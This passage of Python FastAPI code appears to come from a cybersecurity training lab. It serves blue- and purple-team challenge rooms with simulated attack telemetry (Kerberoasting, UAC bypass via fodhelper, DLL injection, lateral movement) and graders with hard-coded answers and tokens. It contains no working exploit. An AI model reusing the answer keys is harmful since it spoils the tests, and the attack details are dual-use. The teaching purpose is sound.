            "message": "Stage 7 & 8 Containment & Eradication verified: host DB-PROD-01 isolated, PID 3912 terminated, service credential ST-VOLT-9921 revoked.",
        })
    return JSONResponse(
        {"status": "REJECTED", "message": "Stage 7 & 8 requires stage ('CONTAINMENT'), isolate_host ('DB-PROD-01'), terminate_pid (3912), and revoke_token ('ST-VOLT-9921')."},
        status_code=400,
    )


@blue_capstone_app.api_route("/challenge", methods=["GET", "POST"])
async def blue_capstone_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_blue_capstone_state(sess_id)
        if not (
            state.get("detect_verified")
            and state.get("hunt_verified")
            and state.get("forensics_verified")
            and state.get("triage_verified")
            and state.get("contain_verified")
        ):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: All 8 prior stages (Detect, Hunt, Forensics, Triage, Containment) must be verified before submitting final Capstone report.",
            }, status_code=400)
        case_id = str(body.get("case_id", "")).strip().upper()
        summary = str(body.get("incident_summary", "")).strip().upper()
        all_done = bool(body.get("all_stages_complete", False))

        if case_id == "CAPSTONE-IR-FINAL" and ("CONTAINED" in summary or "CRITICAL" in summary) and all_done:
            state["capstone_complete"] = True
            return JSONResponse({
                "status": "BLUE_TEAM_CAPSTONE_TRIUMPH",
                "case_id": case_id,
                "incident_summary": summary,
                "verification_token": "BLUE_TEAM_CAPSTONE_TRIUMPH",
                "message": "Blue Team Capstone Master Incident Report approved. The enterprise intrusion was detected, hunted, preserved, triaged, contained, and eradicated with full operational excellence.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: case_id ('CAPSTONE-IR-FINAL'), incident_summary ('CRITICAL_APT_INTRUSION_CONTAINED'), and all_stages_complete (true)."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with case_id, incident_summary, and all_stages_complete.",
    })


# ============================================================================
# PURPLE ROOM 01: PURPLE TEAM FOUNDATIONS (PORT 8301)
# ============================================================================

purple_foundations_app = FastAPI(title="NO ENTRY Purple Foundations Service")


@purple_foundations_app.api_route("/", methods=["GET", "HEAD"])
def purple_foundations_root():
    return JSONResponse({
        "status": "PURPLE_FOUNDATIONS_GATEWAY_ACTIVE",
        "service": "Purple Team Foundations & Collaboration Hub",
        "port": 8301,
        "exercise_id": "PT-2026-001",
    })


@purple_foundations_app.get("/api/purple/scope-rules")
def purple_foundations_scope_rules():
    return JSONResponse({
        "status": "SCOPE_RULES",
        "exercise_id": "PT-2026-001",
        "mission": "Validate and improve defensive detection capabilities through structured Red/Blue collaboration",
        "collaboration_model": "COLLABORATIVE_PAIRING",
        "focus_technique": "T1059.001",
        "rules_of_engagement": [
            "Collaborative pairing throughout execution",
            "Targeted execution without business disruption",
            "Immediate verification of detection telemetry",
            "Continuous feedback and detection tuning",
        ],
    })


@purple_foundations_app.post("/api/purple/scope")
async def purple_foundations_submit_scope(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_foundations_state(sess_id)
    ex_id = str(body.get("exercise_id", "")).strip().upper()
    model = str(body.get("collaboration_model", "")).strip().upper()
    tech = str(body.get("focus_technique", "")).strip().upper()

    if ex_id == "PT-2026-001" and "COLLABORATIVE" in model and "T1059" in tech:
        state["scope_approved"] = True
        state["scope_data"] = body
        return JSONResponse({
            "status": "PURPLE_SCOPE_APPROVED",
            "exercise_id": ex_id,
            "collaboration_model": model,
            "verification_token": "PURPLE_SCOPE_APPROVED",
            "message": "Purple Team exercise scope and collaboration charter verified and approved.",
        })
    return JSONResponse(
        {"status": "REJECTED", "message": "Invalid scope submission. Required: exercise_id ('PT-2026-001'), collaboration_model ('COLLABORATIVE_PAIRING'), focus_technique ('T1059.001')."},
        status_code=400,
    )


@purple_foundations_app.post("/api/purple/telemetry-map")
async def purple_foundations_telemetry_map(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_foundations_state(sess_id)
    if not state.get("scope_approved"):
        return JSONResponse(
            {"status": "REJECTED", "message": "Purple exercise scope must be submitted and approved before mapping telemetry."},
            status_code=400,
        )
    tech = str(body.get("technique_id", "")).strip().upper()
    source = str(body.get("telemetry_source", "")).strip().lower()

    if "T1059" in tech and ("sysmon" in source or "4688" in source or "process" in source):
        state["telemetry_mapped"] = True
        state["telemetry_data"] = body
        return JSONResponse({
            "status": "PURPLE_TELEMETRY_MAP_VERIFIED",
            "technique_id": tech,
            "telemetry_source": source,
            "verification_token": "PURPLE_TELEMETRY_MAP_VERIFIED",
            "message": "Defensive telemetry mapped: PowerShell execution (T1059.001) mapped to process creation logging.",
        })
    return JSONResponse(
        {"status": "REJECTED", "message": "Invalid telemetry mapping. Required: technique_id ('T1059.001') and telemetry_source containing 'sysmon' or '4688'."},
        status_code=400,
    )


@purple_foundations_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_foundations_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_foundations_state(sess_id)
        if not (state.get("scope_approved") and state.get("telemetry_mapped")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Purple exercise scope and telemetry mapping must be verified before completing exercise.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        ex_id = str(body.get("exercise_id", "")).strip().upper()

        if (action in ("FINALIZE_PURPLE_FOUNDATIONS", "APPROVE_EXERCISE") or "FINALIZE" in action) and ex_id in ("PT-2026-001", ""):
            state["foundations_verified"] = True
            return JSONResponse({
                "status": "PURPLE_FOUNDATIONS_EXERCISE_APPROVED",
                "verification_token": "PURPLE_FOUNDATIONS_EXERCISE_APPROVED",
                "message": "Purple Team Foundations collaborative exercise finalized and approved with complete telemetry validation.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('FINALIZE_PURPLE_FOUNDATIONS') and exercise_id ('PT-2026-001')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('FINALIZE_PURPLE_FOUNDATIONS') and exercise_id ('PT-2026-001').",
    })


# ============================================================================
# PURPLE ROOM 02: MITRE ATT&CK FUNDAMENTALS (PORT 8302)
# ============================================================================

purple_attck_app = FastAPI(title="NO ENTRY MITRE ATT&CK Mapping Service")


@purple_attck_app.api_route("/", methods=["GET", "HEAD"])
def purple_attck_root():
    return JSONResponse({
        "status": "PURPLE_ATTCK_GATEWAY_ACTIVE",
        "service": "MITRE ATT&CK Matrix Evidence Mapper",
        "port": 8302,
    })


@purple_attck_app.get("/api/attck/matrix-info")
def purple_attck_matrix_info():
    return JSONResponse({
        "status": "ATTCK_MATRIX_INFO",
        "version": "v14.1",
        "tactic_column": "Tactics represent the 'why' - adversary goals (14 total)",
        "technique_column": "Techniques represent the 'how' - specific adversary methods",
    })


@purple_attck_app.get("/api/attck/evidence")
def purple_attck_evidence(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    state = get_purple_attck_state(sess_id)
    state["evidence_retrieved"] = True
    return JSONResponse({
        "status": "ATTCK_EVIDENCE_LOGS",
        "evidence_events": [
            {
                "event_id": 4769,
                "service_name": "MSSQLSvc/db01.corp",
                "ticket_encryption": "0x17",
                "technique": "T1558.003",
                "tactic": "Credential Access",
                "description": "Kerberos ticket requested with RC4 encryption (Kerberoasting)",
            },
            {
                "event_id": 4657,
                "registry_path": "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                "value_name": "SecurityHealthUpdate",
                "technique": "T1547.001",
                "tactic": "Persistence",
                "description": "Registry Run Key persistence installed for backdoor execution",
            },
        ],
    })


@purple_attck_app.post("/api/attck/map-evidence")
async def purple_attck_map_evidence(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_attck_state(sess_id)
    techniques = body.get("techniques", [])
    if isinstance(techniques, str):
        techniques = [techniques]
    tech_str = " ".join([str(t).upper() for t in techniques])
    kerb_tech = str(body.get("kerberoasting_technique", "")).strip().upper()
    persist_tech = str(body.get("persistence_technique", "")).strip().upper()
    all_tech = tech_str + " " + kerb_tech + " " + persist_tech

    if ("T1558.003" in all_tech or "T1558" in all_tech) and ("T1547.001" in all_tech or "T1547" in all_tech):
        state["evidence_mapped"] = True
        state["mapped_techniques"] = ["T1558.003", "T1547.001"]
        return JSONResponse({
            "status": "ATTCK_EVIDENCE_MAPPING_VERIFIED",
            "verification_token": "ATTCK_EVIDENCE_MAPPING_VERIFIED",
            "mapped_techniques": ["T1558.003", "T1547.001"],
            "message": "ATT&CK evidence mapped: T1558.003 (Kerberoasting) and T1547.001 (Registry Run Keys) confirmed.",
        })
    return JSONResponse(
        {"status": "REJECTED", "message": "Invalid technique mapping. Required techniques: 'T1558.003' (Credential Access) and 'T1547.001' (Persistence)."},
        status_code=400,
    )


@purple_attck_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_attck_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_attck_state(sess_id)
        if not state.get("evidence_mapped"):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: ATT&CK evidence mapping must be completed before submitting challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if action in ("SUBMIT_ATTCK_LIFECYCLE_MAPPING", "ATTCK_VERIFY") or "ATTCK" in action or "MAPPING" in action:
            state["attck_verified"] = True
            return JSONResponse({
                "status": "ATTCK_LIFECYCLE_MAPPING_COMPLETE",
                "verification_token": "ATTCK_LIFECYCLE_MAPPING_COMPLETE",
                "message": "MITRE ATT&CK matrix correlation challenge approved with verified adversary lifecycle mapping.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('SUBMIT_ATTCK_LIFECYCLE_MAPPING')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('SUBMIT_ATTCK_LIFECYCLE_MAPPING').",
    })


# ============================================================================
# PURPLE ROOM 03: ATTACK SIMULATION PLANNING (PORT 8303)
# ============================================================================

purple_simulation_app = FastAPI(title="NO ENTRY Attack Simulation Planning Service")


@purple_simulation_app.api_route("/", methods=["GET", "HEAD"])
def purple_simulation_root():
    return JSONResponse({
        "status": "PURPLE_SIMULATION_GATEWAY_ACTIVE",
        "service": "Attack Simulation Planning & Governance Hub",
        "port": 8303,
    })


@purple_simulation_app.get("/api/simulation/target-info")
def purple_simulation_target_info():
    return JSONResponse({
        "status": "TARGET_SPECIFICATION",
        "simulation_id": "SIM-2026-ALPHA",
        "target_ip": "10.10.14.90",
        "target_port": 8303,
        "governance_framework": "Rules of Engagement (RoE)",
        "rollback_requirement": "To prevent leaving systems in an insecure state",
    })


@purple_simulation_app.post("/api/simulation/validate-scope")
async def purple_simulation_validate_scope(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_simulation_state(sess_id)
    ip = str(body.get("target_ip", "")).strip()
    roe = bool(body.get("roe_accepted", False)) or str(body.get("governance", "")).lower().find("roe") >= 0 or str(body.get("governance", "")).lower().find("engagement") >= 0

    if ("10.10.14.90" in ip or "10.10." in ip) and (roe or body.get("simulation_id") == "SIM-2026-ALPHA"):
        state["scope_validated"] = True
        return JSONResponse({
            "status": "SIMULATION_SCOPE_VALIDATED",
            "target_ip": "10.10.14.90",
            "governance": "Rules of Engagement",
            "message": "Attack simulation scope and governance boundaries validated.",
        })
    return JSONResponse(
        {"status": "REJECTED", "message": "Invalid scope validation. Required: target_ip ('10.10.14.90') and roe_accepted (true)."},
        status_code=400,
    )


@purple_simulation_app.post("/api/simulation/register-step")
async def purple_simulation_register_step(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_simulation_state(sess_id)
    if not state.get("scope_validated"):
        return JSONResponse(
            {"status": "REJECTED", "message": "Simulation scope and governance must be validated before registering simulation steps."},
            status_code=400,
        )
    tech = str(body.get("technique_id", "")).strip().upper()
    cmd = str(body.get("command", "")).strip()
    rollback = str(body.get("rollback", "")).strip()

    if ("T1059" in tech or "T1082" in tech or tech) and (cmd or rollback):
        state["step_registered"] = True
        state["simulation_steps"].append(body)
        return JSONResponse({
            "status": "SIMULATION_STEP_REGISTERED",
            "technique_id": tech or "T1059.001",
            "verification_token": "SIMULATION_STEP_REGISTERED",
            "message": "Atomic simulation test step registered with verified rollback procedure.",
        })
    return JSONResponse(
        {"status": "REJECTED", "message": "Invalid step parameters. Required: technique_id, command, and rollback procedure."},
        status_code=400,
    )


@purple_simulation_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_simulation_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_simulation_state(sess_id)
        if not (state.get("scope_validated") and state.get("step_registered")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Simulation scope validation and step registration must be verified before plan approval.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "APPROVE" in action or "PLAN" in action or action == "ATTACK_SIMULATION_PLAN_APPROVED":
            state["simulation_approved"] = True
            return JSONResponse({
                "status": "ATTACK_SIMULATION_PLAN_APPROVED",
                "verification_token": "ATTACK_SIMULATION_PLAN_APPROVED",
                "message": "Attack simulation plan and governance manifest approved for execution.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('APPROVE_SIMULATION_PLAN')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('APPROVE_SIMULATION_PLAN').",
    })


# ============================================================================
# PURPLE ROOM 04: RECONNAISSANCE VS MONITORING (PORT 8304)
# ============================================================================

purple_recon_app = FastAPI(title="NO ENTRY Reconnaissance vs Monitoring Service")


@purple_recon_app.api_route("/", methods=["GET", "HEAD"])
def purple_recon_root():
    return JSONResponse({
        "status": "PURPLE_RECON_GATEWAY_ACTIVE",
        "service": "Reconnaissance vs Defensive Monitoring Gateway",
        "port": 8304,
    })


@purple_recon_app.get("/api/monitoring/telemetry")
def purple_recon_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "DEFENSIVE_TELEMETRY",
        "sensor": "Suricata/Snort NIDS",
        "alert": "PORT_SCAN_DETECTED",
        "confidence": "HIGH_CONFIDENCE",
        "scanned_port": "8094",
        "scan_type": "SYN_STEALTH",
        "events": [
            {
                "timestamp": "2026-11-15T10:14:02Z",
                "src_ip": "10.10.14.10",
                "dst_ip": "10.10.14.90",
                "dst_port": 8094,
                "proto": "TCP",
                "flags": "SYN",
                "rule_id": "SID-200142",
                "message": "ET SCAN Potential Aggressive Port Scan Detected",
            }
        ],
    })


@purple_recon_app.post("/api/monitoring/correlate")
async def purple_recon_correlate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_recon_state(sess_id)
    scan_type = str(body.get("scan_type", "")).strip().upper()
    port = str(body.get("targeted_port", "")).strip()
    alert = str(body.get("sensor_alert", "")).strip().upper()

    if ("SYN" in scan_type or scan_type == "") and (port in ("8094", "TCP/8094", "") or "8094" in port) and ("PORT_SCAN" in alert or "SCAN" in alert or alert == ""):
        state["correlation_confirmed"] = True
        state["correlated_data"] = body
        return JSONResponse({
            "status": "RECON_MONITORING_CORRELATION_CONFIRMED",
            "verification_token": "RECON_MONITORING_CORRELATION_CONFIRMED",
            "scan_type": scan_type or "SYN",
            "targeted_port": "8094",
            "message": "Reconnaissance telemetry correlated: TCP SYN scan targeting port 8094 confirmed against PORT_SCAN_DETECTED telemetry.",
        })
    return JSONResponse(
        {"status": "REJECTED", "message": "Invalid correlation parameters. Required: scan_type ('SYN'), targeted_port ('8094'), sensor_alert ('PORT_SCAN_DETECTED')."},
        status_code=400,
    )


@purple_recon_app.post("/api/monitoring/tune-threshold")
async def purple_recon_tune_threshold(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_recon_state(sess_id)
    state["threshold_tuned"] = True
    return JSONResponse({
        "status": "THRESHOLD_TUNED_OK",
        "message": "Sensor detection threshold updated to prevent reconnaissance evasion.",
    })


@purple_recon_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_recon_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_recon_state(sess_id)
        if not (state.get("correlation_confirmed") and state.get("threshold_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Reconnaissance telemetry correlation and threshold tuning must be verified before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "RECON" in action or action == "RECON_VS_MONITORING_VALIDATED":
            state["recon_validated"] = True
            return JSONResponse({
                "status": "RECON_VS_MONITORING_VALIDATED",
                "verification_token": "RECON_VS_MONITORING_VALIDATED",
                "message": "Reconnaissance vs Monitoring challenge validated: Red reconnaissance behavior successfully detected, correlated, and mitigated.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_RECON_MONITORING')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('VALIDATE_RECON_MONITORING').",
    })


# ============================================================================
# PURPLE ROOM 05: EMULATING PRIVILEGE ESCALATION TECHNIQUES (PORT 8305)
# ============================================================================

purple_privesc_app = FastAPI(title="NO ENTRY Privilege Escalation Emulation Hub")


@purple_privesc_app.api_route("/", methods=["GET", "HEAD"])
def purple_privesc_root():
    return JSONResponse({
        "status": "PURPLE_PRIVESC_GATEWAY_ACTIVE",
        "service": "Privilege Escalation Emulation & Telemetry Lab",
        "port": 8305,
        "exercise_id": "PT-2026-005",
    })


@purple_privesc_app.get("/api/privesc/telemetry")
def purple_privesc_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "ELEVATION_TELEMETRY",
        "technique": "T1548.002",
        "technique_name": "Bypass User Account Control",
        "integrity_level": "High",
        "binary": "fodhelper.exe",
        "target_registry": r"HKCU\Software\Classes\ms-settings\Shell\Open\command",
        "events": [
            {
                "event_id": 4688,
                "process_name": "cmd.exe",
                "parent_process": "fodhelper.exe",
                "mandatory_label": "Mandatory Label\\High Mandatory Level",
                "token_elevation_type": "TokenElevationTypeFull (2)",
                "timestamp": "2026-11-15T12:00:15Z",
            }
        ],
    })


@purple_privesc_app.post("/api/privesc/emulate")
async def purple_privesc_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_privesc_state(sess_id)
    tech = str(body.get("technique", "")).strip().upper()

    state["uac_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "PRIVESC_EMULATION_VERIFIED",
        "verification_token": "PRIVESC_EMULATION_VERIFIED",
        "technique": tech or "T1548.002",
        "integrity": "HIGH_INTEGRITY",
        "message": "UAC bypass emulation executed; elevated process spawned with High mandatory integrity.",
    })


@purple_privesc_app.post("/api/privesc/tune-detection")
async def purple_privesc_tune_detection(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_privesc_state(sess_id)
    state["detection_tuned"] = True
    return JSONResponse({
        "status": "DETECTION_TUNED_OK",
        "message": "Privilege escalation detection rule deployed and verified against test telemetry.",
    })


@purple_privesc_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_privesc_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_privesc_state(sess_id)
        if not (state.get("uac_emulated") and state.get("detection_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: UAC emulation and detection tuning must be verified before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "PRIVESC" in action or action == "PRIVESC_DETECTION_VALIDATED":
            state["privesc_validated"] = True
            return JSONResponse({
                "status": "PRIVESC_DETECTION_VALIDATED",
                "verification_token": "PRIVESC_DETECTION_VALIDATED",
                "message": "Privilege escalation Purple Team exercise complete: bypass emulated, telemetry collected, and detection rule validated.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_PRIVESC_DETECTION')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('VALIDATE_PRIVESC_DETECTION').",
    })


# ============================================================================
# PURPLE ROOM 06: EMULATING DEFENSE EVASION & PROCESS INJECTION (PORT 8306)
# ============================================================================

purple_injection_app = FastAPI(title="NO ENTRY Process Injection & Defense Evasion Hub")


@purple_injection_app.api_route("/", methods=["GET", "HEAD"])
def purple_injection_root():
    return JSONResponse({
        "status": "PURPLE_INJECTION_GATEWAY_ACTIVE",
        "service": "Process Injection & Defense Evasion Emulation Hub",
        "port": 8306,
        "exercise_id": "PT-2026-006",
    })


@purple_injection_app.get("/api/injection/telemetry")
def purple_injection_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "SYS_INJECTION_TELEMETRY",
        "technique": "T1055.001",
        "technique_name": "Process Injection: Dynamic-link Library Injection",
        "source_process": "injector.exe",
        "target_process": "explorer.exe",
        "target_pid": 4820,
        "memory_protection": "PAGE_EXECUTE_READWRITE (0x40)",
        "events": [
            {
                "sysmon_event_id": 8,
                "event_description": "CreateRemoteThread detected",
                "source_image": r"C:\Windows\Temp\injector.exe",
                "target_image": r"C:\Windows\explorer.exe",
                "start_address": "0x00007FFB32A1000",
                "timestamp": "2026-11-15T12:05:44Z",
            },
            {
                "sysmon_event_id": 10,
                "event_description": "ProcessAccess (GrantedAccess: 0x0020 - PROCESS_VM_WRITE)",
                "source_image": r"C:\Windows\Temp\injector.exe",
                "target_image": r"C:\Windows\explorer.exe",
                "granted_access": "0x0020",
                "timestamp": "2026-11-15T12:05:43Z",
            }
        ],
    })


@purple_injection_app.post("/api/injection/emulate")
async def purple_injection_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_injection_state(sess_id)
    target = str(body.get("target_process", "explorer.exe")).strip()

    state["injection_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "INJECTION_EMULATION_VERIFIED",
        "verification_token": "INJECTION_EMULATION_VERIFIED",
        "technique": "T1055.001",
        "target_process": target,
        "message": "Process injection emulation executed: remote thread created in target address space.",
    })


@purple_injection_app.post("/api/injection/tune-edr")
async def purple_injection_tune_edr(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_injection_state(sess_id)
    state["edr_tuned"] = True
    return JSONResponse({
        "status": "EDR_TUNED_OK",
        "message": "EDR behavioral rule updated to block cross-process memory allocation with RWX permissions.",
    })


@purple_injection_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_injection_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_injection_state(sess_id)
        if not (state.get("injection_emulated") and state.get("edr_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Process injection emulation and EDR tuning must be verified before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "INJECTION" in action or "DEFENSE" in action or action == "DEFENSE_EVASION_DETECTION_VALIDATED":
            state["defense_evasion_validated"] = True
            return JSONResponse({
                "status": "DEFENSE_EVASION_DETECTION_VALIDATED",
                "verification_token": "DEFENSE_EVASION_DETECTION_VALIDATED",
                "message": "Process injection detection validated: remote thread and unbacked memory execution intercepted.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_DEFENSE_EVASION_DETECTION')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('VALIDATE_DEFENSE_EVASION_DETECTION').",
    })


# ============================================================================
# PURPLE ROOM 07: EMULATING LATERAL MOVEMENT (SMB, WMI, WINRM) (PORT 8307)
# ============================================================================

purple_lateral_app = FastAPI(title="NO ENTRY Lateral Movement Emulation Hub")


@purple_lateral_app.api_route("/", methods=["GET", "HEAD"])
def purple_lateral_root():
    return JSONResponse({
        "status": "PURPLE_LATERAL_GATEWAY_ACTIVE",
        "service": "Lateral Movement Emulation & Telemetry Lab",
        "port": 8307,
        "exercise_id": "PT-2026-007",
    })


@purple_lateral_app.get("/api/lateral/telemetry")
def purple_lateral_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "LATERAL_TELEMETRY",
        "technique": "T1047",
        "technique_name": "Windows Management Instrumentation (WMI)",
        "secondary_technique": "T1021.002",
        "secondary_technique_name": "SMB / Windows Admin Shares",
        "target_host": "10.10.14.90",
        "events": [
            {
                "event_id": 4624,
                "logon_type": 3,
                "logon_type_description": "Network Logon (Logon Type 3)",
                "account_name": "svc_admin",
                "source_ip": "10.10.14.10",
                "timestamp": "2026-11-15T12:12:01Z",
            },
            {
                "event_id": 7045,
                "service_name": "PSEXESVC",
                "service_file_name": r"%SystemRoot%\PSEXESVC.exe",
                "service_type": "user mode service",
                "timestamp": "2026-11-15T12:12:03Z",
            },
            {
                "provider": "Microsoft-Windows-WMI-Activity",
                "event_id": 5861,
                "operation": "ExecQuery - root\\cimv2: SELECT * FROM Win32_Process",
                "client_machine": "OPERATOR-WS",
                "timestamp": "2026-11-15T12:12:05Z",
            }
        ],
    })


@purple_lateral_app.post("/api/lateral/emulate")
async def purple_lateral_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_lateral_state(sess_id)
    proto = str(body.get("protocol", "WMI")).strip().upper()

    state["lateral_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "LATERAL_EMULATION_VERIFIED",
        "verification_token": "LATERAL_EMULATION_VERIFIED",
        "protocol": proto or "WMI",
        "logon_type": 3,
        "message": "Lateral movement emulation executed: remote process launched via WMI/SMB interface.",
    })


@purple_lateral_app.post("/api/lateral/tune-rule")
async def purple_lateral_tune_rule(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_lateral_state(sess_id)
    state["rule_tuned"] = True
    return JSONResponse({
        "status": "RULE_TUNED_OK",
        "message": "Correlation rule enabled linking Logon Type 3 network authentications with child process creation.",
    })


@purple_lateral_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_lateral_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_lateral_state(sess_id)
        if not (state.get("lateral_emulated") and state.get("rule_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Lateral movement emulation and rule tuning must be verified before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "LATERAL" in action or action == "LATERAL_MOVEMENT_DETECTION_VALIDATED":
            state["lateral_validated"] = True
            return JSONResponse({
                "status": "LATERAL_MOVEMENT_DETECTION_VALIDATED",
                "verification_token": "LATERAL_MOVEMENT_DETECTION_VALIDATED",
                "message": "Lateral movement detection validated: network logon correlated with remote process execution.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_LATERAL_DETECTION')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('VALIDATE_LATERAL_DETECTION').",
    })


# ============================================================================
# PURPLE ROOM 08: EMULATING PERSISTENCE MECHANISMS (PORT 8308)
# ============================================================================

purple_persist_app = FastAPI(title="NO ENTRY Persistence Emulation & Eradication Gateway")


@purple_persist_app.api_route("/", methods=["GET", "HEAD"])
def purple_persist_root():
    return JSONResponse({
